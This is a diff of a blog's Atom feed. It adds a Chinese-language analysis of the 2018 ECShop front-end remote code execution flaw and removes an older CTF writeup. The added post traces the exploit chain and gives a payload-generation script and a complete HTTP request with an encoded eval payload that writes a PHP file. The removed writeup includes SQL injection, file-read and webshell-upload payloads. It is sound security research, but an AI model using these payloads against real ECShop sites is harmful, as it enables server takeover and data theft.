@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2018-07-31T05:19:20.724Z</updated>
+  <updated>2018-09-10T11:50:06.037Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -14,6 +14,67 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ECShop前台RCE漏洞分析</title>
+    <link href="https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/"/>
+    <id>https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/</id>
+    <published>2018-09-10T05:11:58.000Z</published>
+    <updated>2018-09-10T11:50:06.037Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>前几天出了个<code>ECShop&lt;= 2.7.x/3.6.x</code>前台RCE，实训太无聊了来分析一波<br><a id="more"></a></p>
+<h2 id="0x01环境搭建"><a href="#0x01环境搭建" class="headerlink" title="0x01环境搭建"></a>0x01环境搭建</h2><ul>
+<li><a href="http://download.ecshop.com/2.7.3/ECShop_V2.7.3_UTF8_release1106.rar" target="_blank" rel="noopener">ECShop_V2.7.3</a></li>
+<li>nginx</li>
+<li>php</li>
+</ul>
+<h2 id="0x02漏洞原理"><a href="#0x02漏洞原理" class="headerlink" title="0x02漏洞原理"></a>0x02漏洞原理</h2><p>漏洞的触发点在/user.php:301，可以看到代码逻辑做了个判断，如果http头部的referer不包含<code>user.php</code>，就将referer赋值给<code>$back_act</code>  </p>
+<p><img src="/img/2018-ecshop-rce-1.png" alt="">  </p>
+<p>接下来第325行以$back_act的值为参数，传入<code>assign</code>方法，该方法的作用是注册变量，将可控变量传递给模板对象，接着使用display方法就能将这个模板渲染出来，来看一下<code>display</code>方法的具体实现（/includes/cls_template.php:100)  </p>
+<p><img src="/img/2018-ecshop-rce-2.png" alt="">  </p>
+<p>可以看到代码获取了$out，$out中有一部分代码就是前面assign注册的变量（这里的技术细节我就不讨论了，有兴趣的师傅可以研究研究），然后将$out依据<code>$_echash</code>分割并且对奇数块执行了insert_mod方法，<code>$_echash</code>是代码里写死的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> $_echash        = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</div></pre></td></tr></table></figure></p>
+<p>所以这里的$val是可控的，继续往下跟<code>insert_mod</code>方法（/includes/cls_template.php:1155）  </p>
+<p><img src="/img/2018-ecshop-rce-3.png" alt="">  </p>
+<p>该方法实现了一个动态函数调用，将传入的字符串分割后，前半部分拼接进函数名，后半部分反序列化为一个对象并传入该函数（这里因为参数可控，直接就能反序列化漏洞了，但是不知道为啥没有师傅提到，可能是被RCE掩盖了8），所以此处我们就能调用一个<code>insert_</code>开头的函数，这里通过网上流传的payload可以知道是调用了一个<code>insert_ads</code>方法（/includes/lib_insert.php:136）</p>
+<p><img src="/img/2018-ecshop-rce-4.png" alt="">  </p>
+<p>代码将传入的对象取出num和id拼接进sql语句，因为对象是可控的，所以这里就存在了sql注入漏洞，结合前面的$out分割和分割取ads函数名和反序列化可以构造注入payload如下<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:36:"*/ union select 1,2,3,4,5,6,7,8,9,10";s:2:"id";s:3:"'/*";&#125;</div></pre></td></tr></table></figure></p>
+<p>拼接进去后的sql长这样<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span><span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span></div></pre></td></tr></table></figure></p>
+<p>放到数据库里可以成功union select出数据  </p>
+<p><img src="/img/2018-ecshop-rce-5.png" alt="">  </p>
+<p>这意味着查询出的结果也是我们可控的，继续啃代码，可以知道查询出来的position_id等于传入对象的id属性时，<code>$position_style</code>会被赋值为查询出的<code>position_style</code>并加入前缀<code>str:</code>接着传入fetch方法中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        $position_style = $row[<span class="string">'position_style'</span>];</div><div class="line">        .</div><div class="line">        .</div><div class="line">        .</div><div class="line"> $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</div></pre></td></tr></table></figure></p>
+<p>跟进fetch方法，后面就是一条长长的利用链了：</p>
+<ul>
+<li>fetch（/includes/cls_template.php:135）：取str:后的字符串，<code>fetch_str</code>处理后传入_eval执行</li>
+<li>_eval（/includes/cls_template.php:1179）：将参数拼接进eval()执行</li>
+<li>fetch_str（/includes/cls_template.php:281）：过滤了一堆参数然后将<code>{}</code>内的字符串传入<code>select</code>中处理，返回处理后的字符串</li>
+<li>select（/includes/cls_template.php:371）：如果传入的参数以<code>$</code>开头，则将其传入<code>get_val</code>并将结果拼接到<code>&lt;?php echo &#39; . $res . &#39;; ?&gt;</code>返回</li>
+<li>get_val（/includes/cls_template.php:553）：避开其他几个判断，直接将参数传入<code>make_val</code>执行并返回</li>
+<li>make_var（/includes/cls_template.php:663）：将字符串拼接进<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;</code>并返回</li>
+</ul>
+<p>根据以上利用链，最后构造的payload为<code>{$&#39;];assert(xxxxxx);//}</code><br>最后拼接进eval的参数长这样（其实上面利用链中还有其他许多分支可以最后拼接出可执行的代码，我就不深入研究了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">''</span>];assert(base64_decode(<span class="string">"ZmlsZV9wdXRfY29udGVudHMoJy4vdGVtcC94aXNoaXIucGhwJywnPD9waHAgcGhwaW5mbygpOz8+Jyk="</span>));<span class="comment">//']; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><p>最后就是构造完整的payload了，我的构造脚本如下，扔到php里运行就好<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$payload = <span class="string">"file_put_contents('./temp/xishir.php','&lt;?php phpinfo();?&gt;')"</span>;</div><div class="line">$res = <span class="string">"\&#123;\$'];assert(base64_decode(\""</span>.base64_encode($payload).<span class="string">"\"));//&#125;"</span>;</div><div class="line"></div><div class="line">bin2hex($res);</div><div class="line">$a = [<span class="string">'num'</span> =&gt; <span class="string">"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x"</span>.bin2hex($res).<span class="string">",9"</span>, <span class="string">'id'</span> =&gt; <span class="string">"'/*"</span>];</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($a);</div></pre></td></tr></table></figure></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">GET</span> <span class="string">/ECShop_V2.7.3_UTF8_release1106/upload/user.php</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: 127.0.0.1</div><div class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</div><div class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</div><div class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:273:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x5c7b24275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a793476644756746343393461584e6f61584975634768774a79776e5044397761484167634768776157356d627967704f7a382b4a796b3d2229293b2f2f7d,9";s:2:"id";s:3:"'/*";&#125;</div><div class="line"><span class="attribute">Connection</span>: close</div></pre></td></tr></table></figure>
+<p>payload运行效果<br><img src="/img/2018-ecshop-rce-5.gif" alt="">  </p>
+<h2 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" title="0x04参考链接"></a>0x04参考链接</h2><ul>
+<li><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a></li>
+<li><a href="www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/">ECShop sqli and rce</a></li>
+</ul>
+<h2 id="0x05后话"><a href="#0x05后话" class="headerlink" title="0x05后话"></a>0x05后话</h2><p>ECShop3.*中只是加了一些防护，核心漏洞点换汤不换药，有兴趣的师傅自行研究8</p>
+<p>有趣的是昨天分析下载代码的时候注册了一下ECShop官方的账号，今天就有小改改打电话问我是不是搞电商的，和她说我只是下载代码来学习研究的，她还推荐我去分析最新的4.*版本，好的我一定分析，咕咕咕</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;前几天出了个&lt;code&gt;ECShop&amp;lt;= 2.7.x/3.6.x&lt;/code&gt;前台RCE，实训太无聊了来分析一波&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
+    
+      <category term="SQL" scheme="https://www.codemonster.cn/tags/SQL/"/>
+    
+  </entry>
   
   <entry>
     <title>2018 RWCTF web WriteUp</title>
@@ -943,65 +1004,9 @@
     
       <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
     
-      <category term="excel" scheme="https://www.codemonster.cn/tags/excel/"/>
-    
       <category term="算法" scheme="https://www.codemonster.cn/tags/%E7%AE%97%E6%B3%95/"/>
     
-  </entry>
-  
-  <entry>
-    <title>2017 XMUT第一届网络信息安全大赛 WriteUp</title>
-    <link href="https://www.codemonster.cn/2017/05/06/2017-xmut-ctf-writeup/"/>
-    <id>https://www.codemonster.cn/2017/05/06/2017-xmut-ctf-writeup/</id>
-    <published>2017-05-06T12:51:00.000Z</published>
-    <updated>2018-05-04T07:47:50.013Z</updated>
-    
-    <content type="html"><![CDATA[<p>因为是赛后写的，有部分拿到flag后需要栅栏解密和凯撒解密的我真的忘了，见谅。<br><a id="more"></a></p>
-<h2 id="Web1-签到"><a href="#Web1-签到" class="headerlink" title="Web1 签到"></a>Web1 签到</h2><p>右键源代码即可看到flag</p>
-<h2 id="Web2-从哪来"><a href="#Web2-从哪来" class="headerlink" title="Web2 从哪来"></a>Web2 从哪来</h2><p>要求从英国访问</p>
-<p>抓包，修改http协议头部的<code>Accept-Language</code>为<code>en-GB</code><br>然后提示ip为<code>1.1.1.1</code>，添加<code>X-forwarded-for:1.1.1.1</code> ，提交即可返回flag</p>
-<h2 id="Web3-前端！前端！"><a href="#Web3-前端！前端！" class="headerlink" title="Web3 前端！前端！"></a>Web3 前端！前端！</h2><p>右键源代码看到一个eval函数，用浏览器控制台<code>console.log(eval函数中的内容)</code>，即可看到一段源码，输入源码中的密码即可拿到flag</p>
-<h2 id="Web4-只有管理员才能拿到flag"><a href="#Web4-只有管理员才能拿到flag" class="headerlink" title="Web4 只有管理员才能拿到flag"></a>Web4 只有管理员才能拿到flag</h2><p>直接访问提示只有管理员可以访问，抓包看到<code>cookie</code>很可疑，base64解码看到user=test;<br>改成<code>user=admin;</code> 再base64加密替换原来的cookie访问页面即可得到flag</p>
-<h2 id="Web5-百战天虫"><a href="#Web5-百战天虫" class="headerlink" title="Web5 百战天虫"></a>Web5 百战天虫</h2><p>源代码提示<code>&lt;meta name=&quot;ROBOTS&quot;</code><br>访问<code>robots.txt</code>即可得到密码，回主页输入密码拿到flag</p>
-<h2 id="Web6-上传"><a href="#Web6-上传" class="headerlink" title="Web6 上传"></a>Web6 上传</h2><p>随便抓包上传一个图片，返回了flag</p>
-<h2 id="Web7-你有密码吗"><a href="#Web7-你有密码吗" class="headerlink" title="Web7 你有密码吗"></a>Web7 你有密码吗</h2><p>右键源码可以看到php源代码，构造万能密码 <code>admin&#39;) or 1=1#</code>，账号密码都输入这个即可返回flag</p>
-<h2 id="Web8-注入"><a href="#Web8-注入" class="headerlink" title="Web8 注入"></a>Web8 注入</h2><p>过滤了空格，用<code>/**/</code>来代替，又过滤了union，select ，<code>双写</code>也能绕过，然后猜测flag在flag表的flag字段<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=1/**/ununionion/**/seselectlect/**/1,flag/**/from/**/flag</div></pre></td></tr></table></figure></p>
-<p>post提交就能拿到flag</p>
-<h2 id="Web9-上传，又是上传！"><a href="#Web9-上传，又是上传！" class="headerlink" title="Web9 上传，又是上传！"></a>Web9 上传，又是上传！</h2><p>上传一个jpg后缀的图马，抓包改后缀为<code>pht</code>就能拿到flag</p>
-<h2 id="Web10-你懂伪协议吗？"><a href="#Web10-你懂伪协议吗？" class="headerlink" title="Web10 你懂伪协议吗？"></a>Web10 你懂伪协议吗？</h2><p>右键源码可以看到源代码，get的user参数的值为admin时，可以包含file参数的值那个文件，还提示了flag在<code>fla9.php</code>，直接<code>file=fla9.php</code>没有显示，想到用伪协议将fla9的源码base64后包含<br>payload：<code>?user=admin&amp;amp;file=php://filter/read=convert.base64-encode/resource=fla9.php</code><br>得到一串base64，base64解密即可得到flag</p>
-<h2 id="Misc1-注意看仔细了"><a href="#Misc1-注意看仔细了" class="headerlink" title="Misc1 注意看仔细了"></a>Misc1 注意看仔细了</h2><p>队友做的，winhex打开图片，flag在最后面</p>
-<h2 id="Misc2-密码就在图片上"><a href="#Misc2-密码就在图片上" class="headerlink" title="Misc2 密码就在图片上"></a>Misc2 密码就在图片上</h2><p>唯一一道没做出来的题，<code>f5隐写术</code>，比赛的时候硬是无数次错过那套工具，<br>提示了密码在图片上，图中最显眼的字符为password，<br>用<code>F5-steganography</code> 工具解密即可拿到flag</p>
-<p><code>java Extract f5.jpg -p password</code></p>
-<h2 id="Misc3-照着题目做"><a href="#Misc3-照着题目做" class="headerlink" title="Misc3 照着题目做"></a>Misc3 照着题目做</h2><p>队友做的，听说照着题目说的点了100次然后拿到flag</p>
-<h2 id="Misc4-你不可能拿得到flag"><a href="#Misc4-你不可能拿得到flag" class="headerlink" title="Misc4 你不可能拿得到flag"></a>Misc4 你不可能拿得到flag</h2><p>猜测是<code>zip伪加密</code>，winhex打开可以看到文件头的标记为没有加密，但是却提示输入密码，定位</p>
-<p><code>50 4B 01 02</code></p>
-<p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
-<p>把这里改成<code>0000</code>保存即可解压，是个二维码，用<code>ps取反</code>后扫描，</p>
-<p>提示这里没有flag，winhex打开二维码图片在最后面找到flag</p>
-<h2 id="Crypto1-base？"><a href="#Crypto1-base？" class="headerlink" title="Crypto1 base？"></a>Crypto1 base？</h2><p>粘贴到<code>hackbar</code>，一直<code>base64解密</code>几次就看到flag了</p>
-<h2 id="Crypto2-你是一名合格的特工吗"><a href="#Crypto2-你是一名合格的特工吗" class="headerlink" title="Crypto2 你是一名合格的特工吗"></a>Crypto2 你是一名合格的特工吗</h2><p><code>摩尔密码</code>解密，得到一串疑似培根密码的东西<br>解密得到<code>thisisflag</code>，加上<code>gctf{}</code>就是flag了</p>
-<h2 id="Crypto3-这是什么鬼？"><a href="#Crypto3-这是什么鬼？" class="headerlink" title="Crypto3 这是什么鬼？"></a>Crypto3 这是什么鬼？</h2><p><code>jsfuck</code>，直接粘贴到浏览器控制台就alert弹出flag了</p>
-<h2 id="Crypto4-隔壁班妹子的表白"><a href="#Crypto4-隔壁班妹子的表白" class="headerlink" title="Crypto4 隔壁班妹子的表白"></a>Crypto4 隔壁班妹子的表白</h2><p>提示妹子大二，天蝎座好像，是要我们手动输日期爆破，但是队友直接用od打开就看到了flag</p>
-<h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p>观察网站，写着TBLOG，没听过，百度有源码但是懒得下载，<br>博客唯一一篇文章提示后台在/admin，访问得到管理员登录页面，下意识输入a<code>dmin admin</code>弱密码登进后台<br>后来发现登陆页面源码里好像也有写密码<br>进后台后观察后台结构，没有数据库备份，没有网站配置，找到一个发布文章的地方，有一个fckeditor编辑器，版本2.6.4.1，找到上传点，一开始各种上传，但是1.php.jpg传上去变成了1_php.jpg，无法达到畸形解析，各种截断也失败了，创建1.php目录也会被过滤成1_php，最后发现上传1.jpg网马后，访问 <code>1.jpg/1.php</code>可以解析php网马，接下来菜刀连接，直接就system权限，在菜刀中查看管理员桌面的<code>flag.txt</code>文件拿到flag</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后剩一题f5没做出来很难受，没有逆向没有pwn，所以还是拿了第一，奖金1200还是很美滋滋的。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;因为是赛后写的，有部分拿到flag后需要栅栏解密和凯撒解密的我真的忘了，见谅。&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
-    
-      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
-    
-      <category term="Misc" scheme="https://www.codemonster.cn/tags/Misc/"/>
-    
-      <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
-    
-      <category term="Crypto" scheme="https://www.codemonster.cn/tags/Crypto/"/>
+      <category term="excel" scheme="https://www.codemonster.cn/tags/excel/"/>
     
   </entry>
   
